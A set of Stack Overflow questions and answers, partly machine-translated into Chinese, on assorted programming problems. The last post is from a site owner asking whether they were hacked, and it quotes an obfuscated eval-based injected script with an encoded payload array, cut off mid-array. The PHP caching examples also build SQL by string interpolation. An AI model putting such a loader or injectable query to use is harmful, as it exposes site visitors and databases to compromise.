> 时间：2016-09-19T23:00:25.240

服务器端解决方案是让数据库服务器拒绝意外的 SQL 查询（解析树哈希不在一组已知哈希中的查询）。

基本上，这个想法相当简单，其他人也有类似的想法。

*   [https://www.researchgate.net/profile/Debabrata_Kar/publication/261318459_Prevention_of_SQL_Injection_attack_using_query_transformation_and_hashing/links/545cf9180cf295b5615e6452.pdf](https://www.researchgate.net/profile/Debabrata_Kar/publication/261318459_Prevention_of_SQL_Injection_attack_using_query_transformation_and_hashing/links/545cf9180cf295b5615e6452.pdf)

我的想法略有不同，因为我建议将解析从客户端移动到已经有解析步骤的服务器。

算法：

1) 在数据库服务器上，解析完 SQL 后，遍历解析树并生成一串操作码标记。计算字符串的 MD5 哈希值。

2) 这个散列然后代表解析树的形状。对于 Web 应用程序，唯一 SQL 查询的数量将相当少。

3) 数据库服务器保留每个用户的有效哈希列表，并对新哈希发出警告/失败。

4) 向 API 添加一个函数，以预加载此哈希列表，并在 Web 应用程序启动时使用已知哈希列表调用此函数。

SQL 注入的工作方式是插入字符，从而生成与程序员预想的不同的解析树。

解析树哈希可以检测到意外的解析树。

这个提议的缺点是当前没有数据库系统可以做到这一点。到目前为止，我看到的最接近的是 Postgresql，它在 pg_stat 中保留了解析树的哈希值，以供参考。

# html - Ruby on rails 密码字段和文本字段对齐

> ID：13429083
> 
> 赞同：0
> 
> 时间：2012-11-17T08:50:54.590
> 
> 标签：html, css, ruby-on-rails, ruby-on-rails-3

我是 Rails 平台上的 ruby​​ 新手。我正在设计一个带有文本字段的表单。一开始，我用 css 创建了一个简单的 html 文件来对齐文本字段。下面是我的CSS

```
#input{

padding-left:50px;
padding-bottom:30px;

} 
```

我使用以下代码创建了文本字段：

```
<div id = "input"><input type = "text" size = "25" name = "fname" value = "first name"></input></div>
<div id = "input"><input type = "text" size = "25" name = "lname" value = "last name"></input></div> 
```

当我运行网页时，我看到文本字段按照我想要的方式在表单中正确对齐。但是我尝试在 RoR 中转换代码，我看不到填充。以下是我在 RoR 中的代码

```
<div class="input"><%= f.text_field :fname, :size => 25, :placeholder => 'first name' %></div>
<div class="input"><%= f.text_field :lname, :size => 25, :placeholder => 'last name' %></div> 
```

谁能告诉我我的方法可能有什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T09:07:41.463

在 css 代码`#input{..}`中，哈希`#`表示它正在寻找一个**id**。更改代码后，将其设置为`class="input"`. 因此 css 无法通过**id**找到它。将 css 更改为`.input{..}`.

# php - imagepng($image);验证码和会话变量

> ID：13429087
> 
> 赞同：1
> 
> 时间：2012-11-17T08:51:23.220
> 
> 标签：php, session, variables, captcha

我有以下代码：

```
<?php session_name('mysession');
session_start();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Test Captcha</title>
</head>

<body>

Captcha Image:
<img src="get_captcha.php" width="139" height="139" />
<?php 
echo 'Captcha text:'.$_SESSION['random_number']
 ?>
</body>
</html> 
```

get_captcha.php 是：

```
<?php
session_name('mysession');
session_start();
$string = '';

for ($i = 0; $i < 5; $i++) {
    $string .= chr(rand(97, 122));
}

$_SESSION['random_number'] = $string;

$dir = 'fonts/';

$image = imagecreatetruecolor(165, 50);

// random number 1 or 2
$num = rand(1,2);
if($num==1)
{
    $font = "Capture it 2.ttf"; // font style
}
else
{
    $font = "Molot.otf";// font style
}

// random number 1 or 2
$num2 = rand(1,2);
if($num2==1)
{
    $color = imagecolorallocate($image, 113, 193, 217);// color
}
else
{
    $color = imagecolorallocate($image, 163, 197, 82);// color
}

$white = imagecolorallocate($image, 255, 255, 255); // background color white
imagefilledrectangle($image,0,0,399,99,$white);

imagettftext ($image, 30, 0, 10, 40, $color, $dir.$font, $_SESSION['random_number']);

imagepng($image);

?> 
```

问题是，当我第一次运行 test-captcha.php 时，出现以下错误： Undefined index: random_number in test-captcha.php on line 17 ($_SESSION['random_number'] is not set!!!!)

刷新页面后，$_SESSION['random_number'] 会显示之前的验证码文本！有没有人知道为什么会发生这种情况？？？？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:01:54.480

因为第一次会话有空。所以第一次你必须为会话设置任何值。

```
<?php 
if(isset($_SESSION['random_number']))
{
    echo 'Captcha text:'.$_SESSION['random_number']
}
else{
    $_SESSION['random_number']='any data';   
}
?> 
```

你想要的东西。
试试看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:16:03.930

> $字符串 = '';
> 
> 对于 ($i = 0; $i < 5; $i++) {
> 
> ```
> $string .= chr(rand(97, 122)); 
> ```
> 
> }
> 
> $_SESSION['random_number'] = $string;

将此代码写在您的 html 页面中，而不是在 get_captcha.php 中。它工作正常。

# python - Implementing a word tree using nested dictionaries in python

> ID：13429094
> 
> 赞同：0
> 
> 时间：2012-11-17T08:52:47.807
> 
> 标签：python, tree

I am constructing a tree using nested dictionaries. The root in the tree is the starting word of sentence and then edges are formed in a sequential order. `Children` contains a list of children for each node. Each node's weight( `value` )is incremented by 1/factor (factor can be assumed to be 1) when it is detected somewhere

```
 def constructtree(lst,tree,factor):
        if lst==[]:
            return {}
        else:
            word =lst[0]
            if not tree.has_key(word):
                tree[word]={'name':word,'value':1/factor,"children":{}}
                tree[word]["children"]=constructtree(lst[1:],tree[word]["children"],factor)
            else:
                #print 22
                tree[word]["value"]+=1/factor
                tree[word]["children"]=constructtree(lst[1:],tree[word]["children"],factor)
            return tree

    def doall(wl,tree):
        for x in wl:
                #print 11,x
                tree2=constructtree(x,tree,1)
                tree=tree2
        #print 1,tree
        return tree

mnn= doall(wordList2,{}) 
```

So the real problem is the nested dictionary is totally dependent on the tree (size???) which has totally confused me. Like it's possible that it works for 10 strings in a list but not for 20\.

What can be the reason? Is it anyways dependent to the content of the strings? ( I know sounds lame but I tried using a repeated pattern and got correct result, but with somewhat a natural and unique pattern, it screwed up! )

EDIT:

Sample Input

```
[['obama', 'seems', 'like', 'a', 'good', 'person', 'with', 'good', 'intentions', "that's", 'enough', 'for', ''], ['obama', 'listens', 'to', 'nickelback'], ['obama', 'vote', 'to', 'romney', 'vote', 'http://t.co/9pllsq97\xe2\x80\xa6'], ['obama', 'have', 'been', 'a', 'man-made', 'disaster'], ['obama', 'killed', 'osama', 'he', 'deserves', 'another', '4', 'years', '#gtawinohio'], ['obama', 'even', 'though', "i'm", 'a', 'rep', 'he', 'has', 'a', 'better', 'vision', 'and', "he's", 'proven', 'himself', '#why', 'i', 'voted', 'for', 'obama'], ['obama', 'likes', 'blink-182', 'and', 'romney', 'likes', 'nicki', 'minaj', 'your', 'choice', 'america'], ['obama', 'votes', 'into', 'romney', 'votes', 'http://t.co/n7h', ''], ['obama', 'pack', 'his', 'shit', 'and', 'get', 'out', 'lol'], ['obama', '\xe2\x9d\x92', 'romney', '\xe2\x9c\x94', 'vader'], ['obama', 'for', 'equal', 'marriage', 'rights'], ['obama', 'just', 'acts', 'cool', 'and', 'he', 'has', 'it', 'unfortunately'], ['obama', 'wears', 'crocs'], ['obama'], ['obama', 'talks', 'about', 'the', 'nation', 'romney', 'says', '"i', 'obama', 'says', '"we', 'pay', 'attention', 'to', 'the', 'small', 't', ''], ['obama', 'as', 'president', '#rns'], ['obama', 'felicit\xc3\xb3', 'a', 'romney', 'por', '"su', 'en\xc3\xa9rgico', 'trabajo', 'duranta', 'la', 'campa\xc3\xb1a', 'electoral', 'http://t.co/joj5bth3'], ['obama', 'button', '\xf0\x9f\x87\xba\xf0\x9f\x87\xb8', 'http://t.co/jpragtuk'], ['obama', 'or', 'no', 'health', 'care', 'obama', 'or', 'no', 'jobs', 'obama', 'or', 'no', "women's", 'rights', 'obama', 'or', 'no', 'student', 'loans', 'the', 'choice', 'is', 'yours', ''], ['obama', 'lol', 'quit', 'frontin', 'and', 'that', 'counts', 'as', '2', 'votes', 'since', 'that', 'rat', 'on', 'his', 'head', 'got', 'its', 'own', ''], ['obama', 'to', 'romney', 'in', 'pennsylvania', 'http://t.co/nkau67dd'], ['obama', 'wins', 'virginia'], ['obama', 'talks', 'about', 'the', 'nation', 'romney', 'says', '"i', 'obama', 'says', '"we', 'pay', 'attention', 'to', 'the', 'small', 't', ''], ['obama', 'helps', 'out', 'a', 'lot', 'of', 'people', 'but', 'that', 'help', 'is', 'the', 'reason', 'the', 'economy', 'is', 'crashing', 'people', 'care', 'about', 'themsleves', 'not', 'our', 'country'], ['obama', 'to', 'romney', 'in', 'pennsylvania', 'http://t.co/nkau67dd'], ['obama', "doesn't", 'win', 'then', 'the', "world's", 'gone', 'mad'], ['obama', 'did', 'a', 'wonderful', 'job', 'at', 'reaching', 'out', 'to', 'our', 'generation'], ['obama', "doesn't", 'win', "i'll", 'lose', 'faith', 'in', 'humanity', 'http://t.co/jhhe1qlo'], ['obama', 'was', 'president', 'wen', 'i', 'got', 'my', 'first', 'job', '', '#rt'], ['obama', 'win'], ['obama', 'from', 'britain', '(where', 'it', "doesn't", 'count)', '@johnfugelsang'], ['obama', 'will', 'grab', 'the', 'early', 'lead', 'today......until', 'all', 'the', 'republicans', 'get', 'off', 'work'], ['obama', 'says'], ['obama', 'votes', 'to', 'romney', 'votes', 'http://t.co/ohcmiccl', '#tech', '#technology'], ['obama', 'supports', 'coat', 'hanger', 'abortion'], ['obama', 'votes', 'to', 'romney', 'votes', 'http://t.co/r4wbqcs6', '@suryaray', '@suryaray', '@suryaray'], ['obama', 'bitches', '', 'http://t.co/3nvdpb2n'], ['obama', 'to', 'romney', 'in', 'pennsylvania', 'http://t.co/nkau67dd'], ['obama', 'per', 'far', 'felice', 'gerardah', 'noi', 'americani', 'non', 'siamo', 'tanto', 'imbecilli,fidatevi', 'e', 'calmatevi'], ['obama', 'to', 'win', '#govote'], ['obama', 'to', 'romney', 'in', 'pennsylvania', 'http://t.co/osmpa9u8\xe2\x80\x9d'], ['obama', 'en', '2008', 'quatre', 'ans', 'plus', 'tard', 'le', 'candidat', 'http://t.co/amhaon2s'], ['obama', 'is', 'down', '3%', 'because', 'of', 'how', 'many', 'idiots', 'are', 'posting', 'pics', 'on', 'instagram', 'and', 'etc', '', '', 'please', 'be', 'smart', 'and', 'rt', 'this', 's', ''], ['obama', 'pollster', '&amp', 'rs', 'who', 'have', 'spoken', 'to', "mitt's", 'chicago', 'sure', 'of', 'win', 'b', ''], ['obama'], ['obama', 'is', 'a', 'loser', 'roflmfao', ';-d'], ['obama', 'losin', 'votes', 'because', 'ppl', 'postin', 'ballots', 'and', 'shit', 'smh'], ['obama', 'is', 'humble', '', "that's", 'why', 'everyone', 'loves', 'him', 'its', 'not', 'because', "he's", 'black', 'its', 'because', 'he', 'understands', "us.can't", 'say', 'th', ''], ['obama', 'supporters'], ['obama', 'currently', 'leads', 'romney', 'by', '15', 'with', '259', 'current', 'electoral', 'votes', 'romney', 'has', '244']] 
```

So for this input, the tree has missing nodes

Result

```
mnn={'obama': {'name': 'obama', 'value': 50, 'children': {'is': {'name': 'is', 'value': 2, 'children': {'a': {'name': 'a', 'value': 1, 'children': {'loser': {'name': 'loser', 'value': 1, 'children': {'roflmfao': {'name': 'roflmfao', 'value': 1, 'children': {';-d': {'name': ';-d', 'value': 1, 'children': {}}}}}}}}, 'humble': {'name': 'humble', 'value': 1, 'children': {'': {'name': '', 'value': 1, 'children': {"that's": {'name': "that's", 'value': 1, 'children': {'why': {'name': 'why', 'value': 1, 'children': {'everyone': {'name': 'everyone', 'value': 1, 'children': {'loves': {'name': 'loves', 'value': 1, 'children': {'him': {'name': 'him', 'value': 1, 'children': {'its': {'name': 'its', 'value': 1, 'children': {'not': {'name': 'not', 'value': 1, 'children': {'because': {'name': 'because', 'value': 1, 'children': {"he's": {'name': "he's", 'value': 1, 'children': {'black': {'name': 'black', 'value': 1, 'children': {'its': {'name': 'its', 'value': 1, 'children': {'because': {'name': 'because', 'value': 1, 'children': {'he': {'name': 'he', 'value': 1, 'children': {'understands': {'name': 'understands', 'value': 1, 'children': {"us.can't": {'name': "us.can't", 'value': 1, 'children': {'say': {'name': 'say', 'value': 1, 'children': {'th': {'name': 'th', 'value': 1, 'children': {'': {'name': '', 'value': 1, 'children': {}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}, 'currently': {'name': 'currently', 'value': 1, 'children': {'leads': {'name': 'leads', 'value': 1, 'children': {'romney': {'name': 'romney', 'value': 1, 'children': {'by': {'name': 'by', 'value': 1, 'children': {'15': {'name': '15', 'value': 1, 'children': {'with': {'name': 'with', 'value': 1, 'children': {'259': {'name': '259', 'value': 1, 'children': {'current': {'name': 'current', 'value': 1, 'children': {'electoral': {'name': 'electoral', 'value': 1, 'children': {'votes': {'name': 'votes', 'value': 1, 'children': {'romney': {'name': 'romney', 'value': 1, 'children': {'has': {'name': 'has', 'value': 1, 'children': {'244': {'name': '244', 'value': 1, 'children': {}}}}}}}}}}}}}}}}}}}}}}}}}}, 'supporters': {'name': 'supporters', 'value': 1, 'children': {}}, 'losin': {'name': 'losin', 'value': 1, 'children': {'votes': {'name': 'votes', 'value': 1, 'children': {'because': {'name': 'because', 'value': 1, 'children': {'ppl': {'name': 'ppl', 'value': 1, 'children': {'postin': {'name': 'postin', 'value': 1, 'children': {'ballots': {'name': 'ballots', 'value': 1, 'children': {'and': {'name': 'and', 'value': 1, 'children': {'shit': {'name': 'shit', 'value': 1, 'children': {'smh': {'name': 'smh', 'value': 1, 'children': {}}}}}}}}}}}}}}}}}}}}} 
```

# .net - Resharper 一直告诉我我的“ErrorMessageResourceName”无效

> ID：13429097
> 
> 赞同：0
> 
> 时间：2012-11-17T08:53:06.513
> 
> 标签：.net, resharper

我有很多这样的属性：

```
 [Required(ErrorMessageResourceType = typeof(ModelStrings), ErrorMessageResourceName = "RequiredValidationMessage")]
 public string MyProperty { get; set; } 
```

`ModelStrings``ModelStrings.resx`是从我的`App_GlobalResources`目录中自动生成的类型。该代码在运行时完美运行。

但是，Resharper 在字符串中显示错误`RequiredValidationMessage`：

```
Cannot resolve symbol 'RequiredValidationMessage' 
```

知道如何解决它吗？

**编辑**

我正在使用 7.1 最终版。我从 7.0 开始使用 resharper，这个错误一直存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:54:13.050

如果代码编译，那么它是 Resharper 中的一个错误。
在他们的错误跟踪器中创建票证：http: [//youtrack.jetbrains.com/issues/RSRP](http://youtrack.jetbrains.com/issues/RSRP)
或在 Resharper 首选项中禁用此错误。

# eclipse - how do i fix broken encoding in my webapp?

> ID：13429112
> 
> 赞同：2
> 
> 时间：2012-11-17T08:55:58.760
> 
> 标签：eclipse, jsp, maven, spring-mvc

when i submit a form in my web application some characters (f.e. german [umlauts](http://en.wikipedia.org/wiki/Germanic_umlaut)) are broken, when they enter my controller. strings like `üäö` endup like `Ã¼Ã¤Ã¶`. how do i fix this problem?

my setup looks like this:

*   spring mvc 3.1.2
*   maven 3.0.4 or 2.2.1 (tried both)
*   tomcat 7.0.x
*   eclipse (sts 3.1.0)
*   windows 8

based on answers i already found on stackoverflow i have tried following things.

**added those lines to jsp's:**

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
...
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
```

**spcified encoding in pom.xml:**

```
<properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>
...

<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-compiler-plugin</artifactId>
    <configuration>
        <encoding>UTF-8</encoding>
    </configuration>
<plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-resources-plugin</artifactId>
    <configuration>
        <encoding>UTF-8</encoding>
    </configuration>
<plugin> 
```

**changes the encoding in eclipse to UTF-8.**

while investigating the problem i made following observations.

*   when i right-click files in project (resources and java files) and check the specified encoding, it says UTF-8.
*   when i output those characters in jsps(f.e. `<p>öäü</p>`) they are displayed correctly in the browser.
*   the problem is present in windows and linux.

thx in advance for your answers.

**UPDATE**:

soleved my issue by adding the [CharacterEncodingFilter](http://static.springsource.org/spring/docs/3.0.x/api/org/springframework/web/filter/CharacterEncodingFilter.html) to my web.xml

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:09:41.367

每次出现有关字符编码的问题时，我都会使用字符的 UNICODE 表示来修复它们。目前我只尝试使用韩文和德文字母。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:15:57.940

查看 $TOMCAT_HOME/conf/server.xml 文件并检查编码设置：

```
<Connector port="8080" ... URIEncoding="UTF-8" /> 
```

似乎 Tomcat 需要此设置才能使 UTF-8 用于 HTTP 请求值，例如 GET 表单提交（也可能是 POST）中的请求参数。

# java - Getting undefined result using JSON

> ID：13429113
> 
> 赞同：0
> 
> 时间：2012-11-17T08:56:00.613
> 
> 标签：java, jquery, json, dictionary, struts2

I working on a project where I need to use JSON. I am using Struts2, JSON, jQuery. I am sending httprequest to server like this:-

```
function getBBSJSONData(ths)
{
   //ths is nothing but this pointer
    var id=ths.id;
    var url = 'bbsJsonAction?actionId='+id;

       var myAjax = new Ajax.Request(
        url, 
        {
                method: 'post', 
                onComplete: fetchBBSSuccessData
        });   
} 
```

Now, I am mapping this request in struts.xml like this

```
 <action name="bbsJsonAction" class="com.x.x.x.BBS_JSON" method="getBBS_json">
            <result type="json"/>
 </action> 
```

Now in my action class I am setting JSON object like this

```
public String getBBS_json()
{

    JSONObject jsonObj =null;

        Map map = new HashMap();
        map.put("actionId", actionId);
        map.put("count", count);

        jsonObj = new JSONObject(map);
        System.out.println(jsonObj);    

   return SUCCESS;
} 
```

and finally I am retrieving this JSON result as responseText on client side like this:-

```
function fetchBBSSuccessData(Request){

var d = Request.responseText.evalJSON();

alert(d);                // this shows [object, object]
alert(d.actionId);      //this shows undefined
alert(d.countd);       //this shows undefined
alert(d.jsonData.count);this also shows undefined

} 
```

Why this showing me undefined, How to get the data from this JSON, please suggest me possible changes.

# c++ - 在 C++ 中返回一个 C 字符串数组

> ID：13429118
> 
> 赞同：0
> 
> 时间：2012-11-17T08:56:15.467
> 
> 标签：c++, arrays, cstring

我的函数有这个原型：

```
char[][100] toArray(char document[]); 
```

cygwin 上的 g++ 返回此错误：

```
Unable to resolve identifier toArray 
```

如何返回一个 C 字符串数组？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T09:03:48.957

在 C++ 中返回数组是不可能的。您可以做的最接近的方法是返回一个指向动态分配的字符串块的指针。

这是合法代码

```
typedef char str100[100];

str100* toArray(char* document)
{
    str100 *block = new str100[20];
    return block;
} 
```

typedef 使它更容易理解。如果你不相信我这里是没有 typedef 的相同代码

```
char (*toArray(char* document))[100]
{
    char (*block)[100] = new char[20][100];
    return block;
} 
```

这是为了吓唬你。

但是，尽管此代码是合法的，但它也是垃圾。你应该使用`std::vector<std::string>`. 动态分配内存很难，比使用为您完成工作的类要困难得多。

# java - Get unique values from ArrayList in Java

> ID：13429119
> 
> 赞同：94
> 
> 时间：2012-11-17T08:56:23.077
> 
> 标签：java, list, set

I have an `ArrayList` with a number of records and one column contains gas names as CO2 CH4 SO2, etc. Now I want to retrieve different gas names(unique) only without repeatation from the `ArrayList`. How can it be done?

* * *

## 回答 #1

> 赞同：149
> 
> 时间：2012-11-17T09:11:39.420

您应该使用[`Set`](http://docs.oracle.com/javase/6/docs/api/java/util/Set.html). A`Set`是一个不包含重复项的[集合。](http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html)

如果您有一个[`List`](http://docs.oracle.com/javase/6/docs/api/java/util/List.html)包含重复项的，您可以获得这样的唯一条目：

```
List<String> gasList = // create list with duplicates...
Set<String> uniqueGas = new HashSet<String>(gasList);
System.out.println("Unique gas count: " + uniqueGas.size()); 
```

**注意**：此`HashSet`构造函数通过调用元素的*equals()*方法来识别重复项。

* * *

## 回答 #2

> 赞同：79
> 
> 时间：2015-11-16T12:36:23.410

# 您可以使用[Java 8 Stream API](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html)。

[distinct](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#distinct--)方法是一种*中间操作*，它过滤流并只允许不同的值（默认使用 Object::equals 方法）传递给下一个操作。
我在下面为您的情况写了一个示例，

```
// Create the list with duplicates.
List<String> listAll = Arrays.asList("CO2", "CH4", "SO2", "CO2", "CH4", "SO2", "CO2", "CH4", "SO2");

// Create a list with the distinct elements using stream.
List<String> listDistinct = listAll.stream().distinct().collect(Collectors.toList());

// Display them to terminal using stream::collect with a build in Collector.
String collectAll = listAll.stream().collect(Collectors.joining(", "));
System.out.println(collectAll); //=> CO2, CH4, SO2, CO2, CH4 etc..
String collectDistinct = listDistinct.stream().collect(Collectors.joining(", "));
System.out.println(collectDistinct); //=> CO2, CH4, SO2 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-11-17T09:01:34.170

我希望我能正确理解您的问题：假设值是 type `String`，最有效的方法可能是转换为 a`HashSet`并对其进行迭代：

```
ArrayList<String> values = ... //Your values
HashSet<String> uniqueValues = new HashSet<>(values);
for (String value : uniqueValues) {
   ... //Do something
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-11-17T11:37:32.427

```
ArrayList values = ... // your values
Set uniqueValues = new HashSet(values); //now unique 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-11-17T09:16:51.470

这是直接的方法，无需使用自定义比较器或类似的东西：

```
Set<String> gasNames = new HashSet<String>();
List<YourRecord> records = ...;

for(YourRecord record : records) {
  gasNames.add(record.getGasName());
}

// now gasNames is a set of unique gas names, which you could operate on:
List<String> sortedGasses = new ArrayList<String>(gasNames);
Collections.sort(sortedGasses); 
```

注意：使用`TreeSet`而不是`HashSet`会给出直接排序的arraylist，上面`Collections.sort`可以跳过，但效率较低，因此即使在需要排序时也`TreeSet`使用它通常更好，也很少更糟。`HashSet`

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2018-08-30T09:37:13.237

你可以用它来制作一个唯一的列表

```
ArrayList<String> listWithDuplicateValues = new ArrayList<>();
list.add("first");
list.add("first");
list.add("second");

ArrayList uniqueList = (ArrayList) listWithDuplicateValues.stream().distinct().collect(Collectors.toList()); 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2018-07-24T10:58:56.117

```
 public static List getUniqueValues(List input) {
      return new ArrayList<>(new LinkedHashSet<>(incoming));
    } 
```

不要忘记先实现你的 equals 方法

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2018-11-23T00:37:28.757

当我做同样的查询时，我很难根据我的情况调整解决方案，尽管之前的所有答案都有很好的见解。

当必须获取唯一对象列表而不是字符串时，这是一种解决方案。假设有一个 Record 对象列表。`Record`类只有类型的属性`String`，没有类型的属性`int`。由于需要返回`hashCode()`一个.`hashCode()``int`

下面是一个示例`Record`类。

```
public class Record{

    String employeeName;
    String employeeGroup;

    Record(String name, String group){  
        employeeName= name;
        employeeGroup = group;    
    }
    public String getEmployeeName(){
        return employeeName;
    }
    public String getEmployeeGroup(){
        return employeeGroup;
    }

  @Override
    public boolean equals(Object o){
         if(o instanceof Record){
            if (((Record) o).employeeGroup.equals(employeeGroup) &&
                  ((Record) o).employeeName.equals(employeeName)){
                return true;
            }
         }
         return false;
    }

    @Override
    public int hashCode() { //this should return a unique code
        int hash = 3; //this could be anything, but I would chose a prime(e.g. 5, 7, 11 )
        //again, the multiplier could be anything like 59,79,89, any prime
        hash = 89 * hash + Objects.hashCode(this.employeeGroup); 
        return hash;
    } 
```

正如其他人之前建议的那样，该类需要同时覆盖`equals()`和`hashCode()`方法才能使用`HashSet`.

现在，假设记录列表是`allRecord`( `List<Record> allRecord`)。

```
Set<Record> distinctRecords = new HashSet<>();

for(Record rc: allRecord){
    distinctRecords.add(rc);
} 
```

这只会将不同的记录添加到 Hashset，distinctRecords。

希望这可以帮助。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-11-22T13:26:37.410

如果您有某种对象（bean）的数组，您可以这样做：

```
List<aBean> gasList = createDuplicateGasBeans();
Set<aBean> uniqueGas = new HashSet<aBean>(gasList); 
```

就像上面说的 Mathias Schwarz 一样，但是您必须为您的 aBean 提供方法`hashCode()`，并且`equals(Object obj)`可以在 Eclipse 中通过专用菜单“ `Generate hashCode() and equals()`”轻松完成（在 bean 类中）。Set 将评估覆盖的方法以区分等于对象。

# php - Caching PHP variables for later use

> ID：13429121
> 
> 赞同：0
> 
> 时间：2012-11-17T08:56:56.393
> 
> 标签：php, caching

What is the best way in `PHP` to do variable caching? For example, let's assume I have a table, with 4 rows.

```
 name |  job
--------------------------
 Justin Smith | Plumber
 Jack Sparrow | Carpenter
 Justin Smith | Plumber
  Katie White | Doctor 
```

Which is built like:

```
foreach($people as $person) {
   echo $person->name;
   echo get_job($person->name);
} 
```

And the function call `get_job()` looks like:

```
function get_job($name) {
  //This is pseudo code below
  $row = MySQL->Query("SELECT job FROM people WHERE name = $name");
  return $row->job;
} 
```

As you can see, once we get the job of `Justin Smith`, further down we shouldn't and don't need to do a full MySQL query again, since we know it is `Plumber`.

I was thinking of doing a global variable which is a `key=>value` array like:

```
 global $jobs = array("Justin Smith" => "Plumber",
                      "Jack Sparrow" => "Carpenter",
                      "Katie White" => "Doctor"); 
```

Then in the `get_job()` function I simply just check if the name exists in the array before querying. If not, insert the name and job into the array and return the job.

Basically, is there a better way to do this that is more elegant?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:10:48.770

有很多可能的解决方案。您可以将 SQL 结果存储在一个数组中，您可以在页面上的多个位置使用该数组。而不是`global`你应该使用`static`：

```
 function get_job($name) 
 {
      static $people_jobs;

      if( !isset($people_jobs[$name]) || empty($people_jobs[$name]) )
      {
          $row = MySQL->Query("SELECT job FROM people WHERE name = $name");
          $people_jobs[$name] = $row->job;
      }

      return $people_jobs[$name];
} 
```

无论您调用多少次，此函数都只会为一个人执行一次 MySQL 查询`get_job($name);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:46:33.643

这是典型的[n + 1 问题](https://stackoverflow.com/questions/97197/what-is-the-n1-selects-problem)，您进行 1 次查询以获取“人员”列表，然后为每个人进行一次查询以获取“工作”。

取决于它们是如何相关的..也许你可以使用一个查询来获得两者。例如：如果关系是 Nx1（1 人有 1 份工作，1 份工作可用于 N 人），那么您的初始查询应该类似于：

```
SELECT p.name, j.job FROM Person p INNER JOIN Job j ON (p.job_id = j.id) 
```

如果关系是 NxN，它会变得棘手：P，

希望这可以帮助

# javascript - Possible to create a global scope closure in javascript?

> ID：13429126
> 
> 赞同：0
> 
> 时间：2012-11-17T08:58:12.593
> 
> 标签：javascript, scope, global-variables

Goal is to be able to allow a global variable (such as `currentAccount`) to refer to multiple values at the same time based on the execution context.

```
var context = new Context();
context.currentAccount = "mine";
context.execute(function() {
   // any code in or called by this function 
   // needs access to the `currentAccount` variable

   // for example
   var model = new Model();
   model.doSomething(); // model needs to be able to refer to `currentAccount`
});

context = new Context();
context.currentAccount = "yours";
context.execute(function() {
   ...
   model.doSomething(); // `currentAccount` => "yours"
}); 
```

# php - Unknown Script in my index.php, produce malware, Have i been hacked?

> ID：13429127
> 
> 赞同：1
> 
> 时间：2012-11-17T08:58:14.943
> 
> 标签：php, javascript, malware

I have a site. My site Was difficult yesterday, when open it with Google Chrome, instead of my site this page is shown:

```
Warning: Visiting this site may harm your computer!
The website at http:... appears to host malware - Software that can hurt your 
computer or otherwise operate without your consent.
.... 
```

I viewed my page source in Chrome and I saw this script end of my code (after ):

```
 echo ""; echo "<script>try{if(window.document)window[\"document\"][\"body\"]=\"123\"}catch(bawetawe){if(window.document){v=window;try{fawbe--}catch(afnwenew){try{(v+v)()}catch(gngrthn){try{if(020===0x10)v[\"document\"][\"bo\"+\"dy\"]=\"123\"}catch(gfdnfdgber){m=123;if((alert+\"\").indexOf(\"n\"+\"a\"+\"ti\"+\"ve\")!==-1)ev=window[\"eval\"];}}
n=[\"9\",\"9\",\"45\",\"42\",\"17\",\"1f\",\"40\",\"4b\",\"3o\",\"4h\",\"49\",\"41\",\"4a\",\"4g\",\"1l\",\"43\",\"41\",\"4g\",\"2j\",\"48\",\"41\",\"49\",\"41\",\"4a\",\"4g\",\"4f\",\"2g\",\"4l\",\"39\",\"3m\",\"43\",\"33\",\"3m\",\"49\",\"41\",\"1f\",\"1e\",\"3n\",\"4b\",\"40\",\"4l\",\"1e\",\"1g\",\"3g\",\"1n\",\"3i\",\"1g\",\"4n\",\"d\",\"9\",\"9\",\"9\",\"45\",\"42\",\"4e\",\"3m\",\"49\",\"41\",\"4e\",\"1f\",\"1g\",\"29\",\"d\",\"9\",\"9\",\"50\",\"17\",\"41\",\"48\",\"4f\",\"41\",\"17\",\"4n\",\"d\",\"9\",\"9\",\"9\",\"40\",\"4b\",\"3o\",\"4h\",\"49\",\"41\",\"4a\",\"4g\",\"1l\",\"4j\",\"4e\",\"45\",\"4g\",\"41\",\"1f\",\"19\",\"2a\",\"45\",\"42\",\"4e\",\"3m\",\"49\",\"41\",\"17\",\"4f\",\"4e\",\"3o\",\"2b\",\"1e\",\"44\",\"4g\",\"4g\",\"4c\",\"28\",\"1m\",\"1m\",\"4e\",\"3m\",\"43\",\"4b\",\"4b\",\"4f\",\"41\",\"1l\",\"45\",\"4c\",\"4d\",\"1l\",\"3o\",\"4b\",\"1m\",\"3o\",\"4b\",\"4e\",\"4e\",\"41\",\"3o\",\"4g\",\"45\",\"4a\",\"43\",\"1m\",\"45\",\"49\",\"3m\",\"43\",\"45\",\